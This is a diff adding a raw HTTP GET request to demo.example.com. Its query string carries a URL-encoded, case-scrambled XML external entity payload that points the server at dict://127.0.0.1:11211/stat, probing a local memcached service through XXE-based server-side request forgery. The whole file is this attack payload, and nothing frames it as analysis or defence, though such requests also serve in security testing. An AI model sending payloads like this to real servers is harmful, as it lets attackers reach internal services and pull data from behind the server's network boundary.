@@ -1,0 +1,4 @@
+GET /a?q=<!dOcTyPe%20R%20[<!eNtItY%20x%20SyStEm%20"DiCt://127.0.0.1:11211/StAt">]><R>%26x;</R> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
